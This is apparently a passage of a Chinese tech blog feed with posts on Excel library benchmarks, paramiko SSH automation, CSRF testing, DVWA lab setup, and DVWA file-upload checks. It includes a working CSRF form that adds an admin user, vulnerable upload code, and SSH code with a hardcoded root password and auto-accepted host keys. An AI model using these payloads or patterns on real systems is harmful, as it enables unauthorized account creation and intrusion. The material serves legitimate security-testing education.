3. 同一个第三方库在不同的 CPU 平台上，增长趋势几乎一致。 4.
另外，鉴于手里两台电脑的 CPU 性能不在同一水平上（R7-4800U 性能得分 842，i5-8400 性能得分 601），不同库在平台之间的写入速率不做深入对比。</p>
<blockquote>
<p>数据来源： <a href="http://rank.kkj.cn/dcpu.shtml">桌面 CPU 性能排行榜</a>，网页数据更新时间：2020-07-22
<a href="http://rank.kkj.cn/mcpu.shtml">笔记本 CPU 性能排行榜</a>，网页数据更新时间：2020-05-25</p>
</blockquote>
<figure>
<img src="/p/6e3b1b9/写入速率总体统计.webp" alt="写入速率总体统计">
<figcaption aria-hidden="true">写入速率总体统计</figcaption>
</figure>
<h2 id="amd平台写入速率趋势">6.2. AMD 平台写入速率趋势</h2>
<p>xlwt/xlrd 库，单次写入最高耗时：242 毫秒。</p>
<figure>
<img src="/p/6e3b1b9/AMD平台xlwt库写入速率趋势分布.webp" alt="AMD平台xlwt库写入速率趋势分布">
<figcaption aria-hidden="true">AMD 平台 xlwt 库写入速率趋势分布</figcaption>
</figure>
<p>openpyxl 库，单次写入最高耗时：549 毫秒。</p>
<figure>
<img src="/p/6e3b1b9/AMD平台openpyxl库写入速率趋势分布.webp" alt="AMD平台openpyxl库写入速率趋势分布">
<figcaption aria-hidden="true">AMD 平台 openpyxl 库写入速率趋势分布</figcaption>
</figure>
<h2 id="inter平台写入速率趋势">6.3. Inter 平台写入速率趋势</h2>
<p>xlwt/xlrd 库，单次写入最高耗时：231 毫秒。</p>
<figure>
<img src="/p/6e3b1b9/Inter平台xlwt库写入速率趋势分布.webp" alt="Inter平台xlwt库写入速率趋势分布">
<figcaption aria-hidden="true">Inter 平台 xlwt 库写入速率趋势分布</figcaption>
</figure>
<p>openpyxl 库，单次写入最高耗时：629 毫秒。</p>
<figure>
<img src="/p/6e3b1b9/Inter平台openpyxl库写入速率趋势分布.webp" alt="Inter平台openpyxl库写入速率趋势分布">
<figcaption aria-hidden="true">Inter 平台 openpyxl 库写入速率趋势分布</figcaption>
</figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>excel读写</tag>
        <tag>xlwt/xlrd</tag>
        <tag>openpyxl</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】如何利用 Python 连接 Linux，远程执行命令并获取输出信息</title>
    <url>/p/47ab775c.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  Python 中有一个第三方模块 -
<code>paramiko</code>，可用于连接 Linux 的 ssh 服务。在实现一些自动化小工具时，是一个十分有用的利器。下面，将简单介绍下该模块的主要功能，以及基于示例代码，展示其对应的效果。</p>
<span id="more"></span>
<hr>
<h1 id="模块安装">2. 模块安装</h1>
<p>  在终端中输入 <code>pip install paramiko</code> 命令，即可安装 <code>paramiko</code> 模块。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">BoycedeiMac:Blogs boyce$ pip install paramiko</span><br><span class="line">Looking <span class="keyword">in</span> indexes: https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">Collecting paramiko</span><br><span class="line">  Downloading https://pypi.tuna.tsinghua.edu.cn/packages/95/19/124e9287b43e6ff3ebb9cdea3e5e8e88475a873c05ccdf8b7e20d2c4201e/paramiko-2.7.2-py2.py3-none-any.whl (206 kB)</span><br><span class="line">     |████████████████████████████████| 206 kB 75 kB/s </span><br><span class="line">Requirement already satisfied: pynacl&gt;=1.0.1 <span class="keyword">in</span> /Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages (from paramiko) (1.3.0)</span><br><span class="line">Requirement already satisfied: cryptography&gt;=2.5 <span class="keyword">in</span> /Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages (from paramiko) (3.2)</span><br><span class="line">Requirement already satisfied: bcrypt&gt;=3.1.3 <span class="keyword">in</span> /Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages (from paramiko) (3.1.7)</span><br><span class="line">Requirement already satisfied: six&gt;=1.4.1 <span class="keyword">in</span> /Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages (from bcrypt&gt;=3.1.3-&gt;paramiko) (1.13.0)</span><br><span class="line">Requirement already satisfied: cffi&gt;=1.1 <span class="keyword">in</span> /Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages (from bcrypt&gt;=3.1.3-&gt;paramiko) (1.13.2)</span><br><span class="line">Requirement already satisfied: pycparser <span class="keyword">in</span> /Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages (from cffi&gt;=1.1-&gt;bcrypt&gt;=3.1.3-&gt;paramiko) (2.19)</span><br><span class="line">Installing collected packages: paramiko</span><br><span class="line">Successfully installed paramiko-2.7.2</span><br></pre></td></tr></tbody></table></figure><p></p>
<hr>
<h1 id="功能介绍">3. 功能介绍</h1>
<ol type="1">
<li>在使用 <code>paramiko</code> 模块连接 Linux 的 ssh 服务时，首先要做的一件事，就是导入该模块，并实例化一个客户端对象，这样的一个 client 对象，就可以实现对象中的很多种方法了。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line">client = paramiko.SSHClient()</span><br></pre></td></tr></tbody></table></figure> <img src="https://ae01.alicdn.com/kf/U1b4817f72b114ad7b079f62d5dbe0a8d5.jpg" alt="client对象中的方法"></li>
<li>要连接 Linux，可调用 connect 方法，以 Linux 服务器的用户名、密码、IP、端口等作为入参，调用完成且未报错后，client 对象即成功连接上了 Linux 服务器，代码示例如下。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 定义linux连接信息</span></span><br><span class="line">ip = <span class="string">'10.10.10.145'</span></span><br><span class="line">port = <span class="number">22</span></span><br><span class="line">account = <span class="string">'root'</span></span><br><span class="line">password = <span class="string">'123456'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接linux</span></span><br><span class="line">client.connect(ip, port, account, password)</span><br></pre></td></tr></tbody></table></figure></li>
<li>如果在连接时返回如下类似的报错，说明本地的 <code>know_hosts</code> 文件中缺少该 Linux 服务器的本地密钥，需要对 client 设置一个服务器密钥策略，错误信息及代码如下。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">client.connect(ip, port, account, password)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/IPython/core/interactiveshell.py"</span>, line <span class="number">3418</span>, <span class="keyword">in</span> run_code</span><br><span class="line">    <span class="built_in">exec</span>(code_obj, <span class="variable language_">self</span>.user_global_ns, <span class="variable language_">self</span>.user_ns)</span><br><span class="line">  File <span class="string">"&lt;ipython-input-5-855a0dd79a05&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    client.connect(ip, port, account, password)</span><br><span class="line">  File <span class="string">"/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/paramiko/client.py"</span>, line <span class="number">416</span>, <span class="keyword">in</span> connect</span><br><span class="line">    <span class="variable language_">self</span>, server_hostkey_name, server_key</span><br><span class="line">  File <span class="string">"/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/paramiko/client.py"</span>, line <span class="number">824</span>, <span class="keyword">in</span> missing_host_key</span><br><span class="line">    <span class="string">"Server {!r} not found in known_hosts"</span>.<span class="built_in">format</span>(hostname)</span><br><span class="line">paramiko.ssh_exception.SSHException: Server <span class="string">'10.10.10.145'</span> <span class="keyword">not</span> found <span class="keyword">in</span> known_hosts</span><br></pre></td></tr></tbody></table></figure> <figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 设置为自动添加主机密钥的策略</span></span><br><span class="line">client.set_missing_host_key_policy(paramiko.AutoAddPolicy)</span><br></pre></td></tr></tbody></table></figure></li>
<li>如果需要对 Linux 服务器执行命令，则可以调用 exec_command 方法，传入需要执行的命令即可。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 定义cmd命令内容</span></span><br><span class="line">cmd = <span class="string">'docker ps;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stdout, stderr分别保存执行命令后的输出信息和错误信息。</span></span><br><span class="line">stdin, stdout, stderr = client.exec_command(cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看输出信息</span></span><br><span class="line">result = stdout.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(line, end=<span class="string">''</span>)</span><br><span class="line"><span class="comment"># Output:</span></span><br><span class="line">CONTAINER ID        IMAGE                      COMMAND                  CREATED             STATUS              PORTS                              NAMES</span><br><span class="line">4ea1f0a6ff8d        xavierniu/cloudreve        <span class="string">"./entrypoint.sh"</span>        <span class="number">4</span> days ago          Up <span class="number">4</span> days           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">5212</span>-&gt;<span class="number">5212</span>/tcp             cloudreve</span><br><span class="line">605366afff5f        939d05495a90               <span class="string">"docker-entrypoint.s…"</span>   <span class="number">9</span> days ago          Up <span class="number">4</span> days           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">3306</span>-&gt;<span class="number">3306</span>/tcp             mariadb</span><br><span class="line">1259e25c2db3        2e772d0e71ce               <span class="string">"/portainer"</span>             <span class="number">10</span> days ago         Up <span class="number">4</span> days           <span class="number">8000</span>/tcp, <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">9000</span>-&gt;<span class="number">9000</span>/tcp   portainer</span><br><span class="line">dd43eec5e03a        ecat/docker-pi-dashboard   <span class="string">"/usr/bin/entry.sh /…"</span>   <span class="number">10</span> days ago         Up <span class="number">4</span> days                                              docker-pi-dashboard</span><br><span class="line"><span class="comment"># 执行错误的命令并查看错误的信息</span></span><br><span class="line">error_cmd = <span class="string">'abcd'</span></span><br><span class="line">stdin, stdout, stderr = client.exec_command(error_cmd)</span><br><span class="line"><span class="comment"># 获取输出信息的长度。</span></span><br><span class="line">result = stdout.readlines()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(result))</span><br><span class="line"><span class="comment"># Output:</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取错误信息</span></span><br><span class="line">err = stderr.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> err = stderr.readlines():</span><br><span class="line">    <span class="built_in">print</span>(line, end=<span class="string">''</span>)</span><br><span class="line"><span class="comment"># Output:</span></span><br><span class="line">bash: abcd: command <span class="keyword">not</span> found</span><br></pre></td></tr></tbody></table></figure></li>
<li>在结束对 Linux 服务器的远程操控后，需要调用 close 方法，关闭 client 对象的连接。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">client.close()</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<hr>
<h1 id="示例代码">4. 示例代码</h1>
<p>完整的示例代码参考如下。 </p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'10.10.10.145'</span></span><br><span class="line">port = <span class="number">22</span></span><br><span class="line">account = <span class="string">'root'</span></span><br><span class="line">password = <span class="string">'123456'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">keyword=<span class="literal">None</span></span>):</span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        client.connect(ip, port, account, password)</span><br><span class="line">        cmd = <span class="string">'docker ps;'</span></span><br><span class="line"></span><br><span class="line">        stdin, stdout, stderr = client.exec_command(cmd)</span><br><span class="line">        result = stdout.readlines()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        client.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    res = connect()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(line, end=<span class="string">''</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Python</tag>
        <tag>远程连接</tag>
      </tags>
  </entry>
  <entry>
    <title>【Security】CSRF 攻击之测试思路总结</title>
    <url>/p/a90042eb.html</url>
    <content><![CDATA[<h1 id="csrf介绍">1. CSRF 介绍</h1>
<p>  CSRF（Cross Site Request
Foregy）, 中文名称之为跨站请求伪造。其攻击的原理是：攻击者利用实际用户的 Cookies 信息，以用户的身份，通过第三方网站，向被攻击网站发送非法请求（这一系列操作均由受害者在不知情的情况下完成的），从而绕过特定的权限进行操作数据、恶意攻击。
  受害对象包含<code>实际用户</code>和<code>被攻击网站</code>。</p>
<span id="more"></span>
<hr>
<h1 id="csrf模拟攻击流程">2. CSRF 模拟攻击流程</h1>
<figure>
<img src="/p/a90042eb/模拟攻击流程.webp" alt="模拟攻击流程">
<figcaption aria-hidden="true">模拟攻击流程</figcaption>
</figure>
<hr>
<h1 id="测试思路">3. 测试思路</h1>
<ol type="1">
<li>使用正常用户登录被测系统，获取涉及个人信息修改、敏感数据操作的请求，记录请求 URL 和参数；</li>
<li>编写 HTML 页面，或通过 Burpsuite 工具，生成相应的页面（需要注意页面内容，部分请求体中也存在防 CSRF 攻击的字段，如：<strong>token</strong>、<strong>anti-CSRF</strong> 等，需要甄别去除）。</li>
<li>使用 1 步骤中的浏览器，打开 HTML 页面，点击发送请求按钮。</li>
</ol>
<hr>
<h1 id="案例-csrf攻击新增用户">4. 案例 - CSRF 攻击新增用户</h1>
<h2 id="测试背景">4.1. 测试背景</h2>
<p>  新增用户功能，属于管理员权限范畴，普通用户无此权限。此次，通过伪造一个新增用户的 html 页面，模拟管理员被诱导访问第三方网站，点击按钮，触发新增用户请求。</p>
<h2 id="测试流程">4.2. 测试流程</h2>
<p>  获取新增用户的请求 url 和参数；</p>
<p><img src="/p/a90042eb/新增用户请求url.webp" alt="新增用户请求url"> <img src="/p/a90042eb/新增用户请求参数.webp" alt="新增用户请求参数"></p>
<p>  编写 HTML 页面，url 和参数填入其中；（该系统的数据库字段有点小 bug，别介意 (～￣▽￣)～）
</p><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF Inject Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:8080/gz/AdminServlet?method=addm&amp;id="</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"user8888"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"123456"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"tel"</span> <span class="attr">value</span>=<span class="string">"生产部"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"realname"</span> <span class="attr">value</span>=<span class="string">"csrf用户"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"男"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"age"</span> <span class="attr">value</span>=<span class="string">"总经理"</span> /&gt;</span></span><br><span class="line">      	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"address"</span> <span class="attr">value</span>=<span class="string">"13112345996"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Click me！"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>  使用管理员登录系统，再新开标签页，打开 HTML 页面，点击按钮发起请求。
- 预期结果：状态码返回 401 鉴权失败，并给出错误提示。 -
实际结果：状态码返回 200，提示操作成功。</p>
<figure>
<img src="/p/a90042eb/csrf攻击请求.webp" alt="csrf攻击请求">
<figcaption aria-hidden="true">csrf 攻击请求</figcaption>
</figure>
<p>  去原系统界面任意操作，查看会话情况。 -
预期结果：会话失效，重定向至登录界面，本次 token 及 sessionID 被销毁（若有）。
- 实际结果：会话仍有效，未退出至登录页面。</p>
<figure>
<img src="/p/a90042eb/界面会话情况.webp" alt="界面会话情况">
<figcaption aria-hidden="true">界面会话情况</figcaption>
</figure>
<p>  去数据库查看用户是否添加成功（因后台数据处理问题导致乱码，不在此测试范围内）。
-
预期结果：数据库用户表未被新增数据，且未影响服务器、数据库等其他系统网元的正常运行。
- 实际结果：数据库用户表新增一条数据。</p>
<figure>
<img src="/p/a90042eb/数据库用户表被插入一条数据.webp" alt="数据库用户表被插入一条数据">
<figcaption aria-hidden="true">数据库用户表被插入一条数据</figcaption>
</figure>
<h2 id="测试结论">4.3. 测试结论</h2>
<p>  综上结果，该项目的新增用户功能存在严重的问题，没有做 anti-CSRF，攻击成功，极易造成垃圾数据过多导致系统崩溃。</p>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>CSRF攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>【Security】Ubuntu 中基于 DVWA 程序搭建个人安全测试环境</title>
    <url>/p/bb712987.html</url>
    <content><![CDATA[<h1 id="dvwa简介">1. DVWA 简介</h1>
<p>  Damn Vulnerable Web App (DVWA)
是基于的 PHP/MySQL 渗透测试 Web 应用程序。其主要目标是协助安全专业人员在合法环境下测试他们的技能和工具，帮助 Web 开发人员更好地了解保护 Web 应用程序的过程，并帮助教师 / 学生在课堂中教授 / 学习 Web 应用程序的安全性。
&gt; 官网：<a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a>
&gt; GitHub 地址：<a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a>
<span id="more"></span></p>
<hr>
<h1 id="工具准备">2. 工具准备</h1>
<table>
<colgroup>
<col style="width: 3%">
<col style="width: 12%">
<col style="width: 10%">
<col style="width: 73%">
</colgroup>
<thead>
<tr class="header">
<th>序号</th>
<th>工具名称</th>
<th>版本</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 1</td>
<td>Ubuntu 系统虚拟机</td>
<td> 16.04 或以上</td>
<td>为了避免泄露个人网络信息，降低个人服务器被攻击风险，建议在本地使用虚拟机，并配置成 NAT 网络模式</td>
</tr>
<tr class="even">
<td> 2</td>
<td>DVWA 应用程序</td>
<td>当前最新是 1.9 </td>
<td><a href="https://github.com/ethicalhack3r/DVWA/archive/v1.9.zip">下载链接</a></td>
</tr>
<tr class="odd">
<td> 3</td>
<td>XAMPP</td>
<td>7.4.6 </td>
<td><a href="https://download.csdn.net/download/Fantasy_Boyce/12503865">下载链接</a></td>
</tr>
</tbody>
</table>
<hr>
<h1 id="环境搭建">3. 环境搭建</h1>
<blockquote>
<p>Ubuntu 虚拟机的安装过程在此不赘述，并且默认大家已配置为 NAT 模式进行网络访问。</p>
</blockquote>
<ol type="1">
<li>将下载好的 xampp-linux-x64-7.4.6-0-installer.run 文件，传输至 Ubuntu 虚拟机中，打开终端，输入以下命令，输入密码后即可弹出界面进行懒人化安装。</li>
</ol>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./xampp-linux-x64-7.4.6-0-installer.run</span><br></pre></td></tr></tbody></table></figure>
<figure>
<img src="/p/bb712987/安装XAMPP.webp" alt="安装XAMPP">
<figcaption aria-hidden="true">安装 XAMPP</figcaption>
</figure>
<ol start="2" type="1">
<li> 将 DVWA.zip 文件，解压后传输至 /opt/lampp/htdocs 路径下。</li>
</ol>
<figure>
<img src="/p/bb712987/复制DVWA文件夹.webp" alt="复制DVWA文件夹">
<figcaption aria-hidden="true">复制 DVWA 文件夹</figcaption>
</figure>
<ol start="3" type="1">
<li>在 /opt/lampp/htdocs/DVWA/config 路径下，复制一份 config.inc.php.dist，并重命名为 config.inc.php。</li>
</ol>
<figure>
<img src="/p/bb712987/复制一份配置文件.webp" alt="复制一份配置文件">
<figcaption aria-hidden="true">复制一份配置文件</figcaption>
</figure>
<ol start="4" type="1">
<li>文本编辑器打开 config.inc.php，修改其中的配置并保存，具体如下：</li>
</ol>
<ul>
<li>修改约 21 行，$_DVWA ['db_password'] 设置为空；</li>
<li>修改约 29，30 行，内容可通过 <a href="https://www.google.com/recaptcha/admin/create">https://www.google.com/recaptcha/admin/create</a> 生成。</li>
</ul>
<figure>
<img src="/p/bb712987/修改DVWA配置文件config.inc.php.webp" alt="修改DVWA配置文件config.inc.php">
<figcaption aria-hidden="true">修改 DVWA 配置文件 config.inc.php</figcaption>
</figure>
<ol start="5" type="1">
<li> 修改 /opt/lampp/htdocs/DVWA/ 下的 php.ini 文件，将 allow_url_fopen 和 allow_url_include 配置成 On（注意 O 是大写）。</li>
</ol>
<figure>
<img src="/p/bb712987/修改DWVA下的php.ini.webp" alt="修改DWVA下的php.ini">
<figcaption aria-hidden="true">修改 DWVA 下的 php.ini</figcaption>
</figure>
<ol start="6" type="1">
<li> 修改 /opt/lampp/etc 下的 php.ini，同样将 allow_url_fopen 和 allow_url_include 配置成 On（注意 O 是大写）。</li>
</ol>
<figure>
<img src="/p/bb712987/修改lampp下的php.ini.webp" alt="修改lampp下的php.ini">
<figcaption aria-hidden="true">修改 lampp 下的 php.ini</figcaption>
</figure>
<ol start="7" type="1">
<li> 在终端中，输入以下命令，启动服务器。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/lampp			<span class="comment"># 进入lampp路径</span></span><br><span class="line"><span class="built_in">sudo</span> ./lampp start		<span class="comment"># 启动服务器</span></span><br><span class="line"><span class="built_in">sudo</span> ./lampp stop		<span class="comment"># 停止服务器</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<figure>
<img src="/p/bb712987/启动服务器.webp" alt="启动服务器">
<figcaption aria-hidden="true">启动服务器</figcaption>
</figure>
<hr>
<h1 id="数据库创建及dvwa访问">4. 数据库创建及 DVWA 访问</h1>
<ol type="1">
<li>浏览器访问 http:// 你的虚拟机 IP/DVWA/setup.php 进行启动检查。</li>
</ol>
<figure>
<img src="/p/bb712987/启动检查.webp" alt="启动检查">
<figcaption aria-hidden="true">启动检查</figcaption>
</figure>
<ol start="2" type="1">
<li>确保上图篮色方框内各项内容是绿色后，点击页面下方的【Create / Reset
Database】按钮，稍等片刻，即可成功创建数据库。在跳转后的登录界面，输入用户名和密码（默认 admin/password），就可开始愉快的渗透测试之旅啦。</li>
</ol>
<figure>
<img src="/p/bb712987/登录页面.webp" alt="登录页面">
<figcaption aria-hidden="true">登录页面</figcaption>
</figure>
<figure>
<img src="/p/bb712987/DVWA主页面.webp" alt="DVWA主页面">
<figcaption aria-hidden="true"> DVWA 主页面</figcaption>
</figure>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
        <tag>安全测试工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【Security】前后台校验之文件上传场景</title>
    <url>/p/9db2193f.html</url>
    <content><![CDATA[<h1 id="场景介绍">1. 场景介绍</h1>
<p>  在 Web 项目开发中，一般会在前台页面对一些关键性的数据输入进行校验，但可能忽略了在后台也添加相应的校验逻辑，这就埋藏了一个较大的安全风险，因此，在安全测试的用例设计时，也需要把这个隐性需求考虑进来。
  前后台校验，顾名思义，就是前台和后台都需要对某一数据进行合法性校验。根据数据的来源，又可将场景分为<code>用户输入数据校验</code>、<code>服务器生成数据校验</code>和<code>文件上传校验</code>三种子场景，本篇博客，将基于 <code>DVWA</code> 测试平台，简要介绍下<code>文件上传校验</code>场景的测试方法及结果。</p>
<h1 id="准备工作">2. 准备工作</h1>
<ol type="1">
<li><p>参考《<a href="/p/bb712987.html">【Security】【测试工具搭建】Ubuntu
中基于 DVWA
程序搭建个人安全测试环境</a>》博客，在 ubuntu 中安装 DVWA 环境，并确保如下配置均为绿色。
<img src="/p/9db2193f/dvwa环境检查.webp" alt="dvwa环境检查"></p></li>
<li><p>安装 Burpsuite 工具，需要注意的是，工具的运行依赖于 java 环境，所以需要提前安装好 JDK，并配置环境变量。</p></li>
<li><p>配置好浏览器的代理。确保 burpsuite 工具可以拦截到浏览器的请求，浏览器建议选择 Chrome 或 Edge，proxy 插件可选择 <a href="https://microsoftedge.microsoft.com/addons/detail/proxy-switchyomega/fdbloeknjpnloaggplaobopplkdhnikc">Proxy
SwitchyOmega</a>。 <img src="/p/9db2193f/proxy插件配置.webp" alt="proxy插件配置"> &gt;
如果 Burpsuite 是 V2021 及以上版本，工具本身已自带了一个 Chromium 浏览器，则第 3 步可以省略，在 <code>Proxy</code> 页签的 <code>Intercept</code> 子页签中，点击 <code>Open Browser</code> 即可。</p></li>
</ol>
<hr>
<h1 id="测试步骤">3. 测试步骤</h1>
<h2 id="low级别场景">3.1. Low 级别场景</h2>
<ol type="1">
<li><p>进入 <code>DVWA Security</code> 页面，将安全等级设置为 <code>Low</code>，再进入 <code>File Upload</code> 页面，通过点击 <code>View Source</code> 查看源码如下所示，可发现后台不存在任何校验的逻辑，也就意味着可以上传任意格式、大小的文件。
</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) {</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], <span class="variable">$target_path</span> ) ) {</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;<span class="subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>在前台选择 php、py、sh 等类型的文件进行上传，均可上传成功，并暴露除了上传目录，通过访问目录，可直接查看文件内容，php 文件则显示出的系统的详细信息。
<img src="/p/9db2193f/恶意py文件.webp" alt="恶意py文件上传成功"> <img src="/p/9db2193f/恶意sh文件.webp" alt="恶意sh文件上传成功"> <img src="/p/9db2193f/获取系统信息的php文件.webp" alt="恶意php文件成功获取系统信息"> <img src="/p/9db2193f/上传目录下的文件.webp" alt="上传目录下的文件"></p></li>
<li><p>获取系统信息的 php 源码如下所示。 </p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 获取系统信息</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<h2 id="medium级别场景">3.2. Medium 级别场景</h2>
<ol type="1">
<li><p>将 DVWA 安全级别修改为 <code>Medium</code> 后，再次查看 File
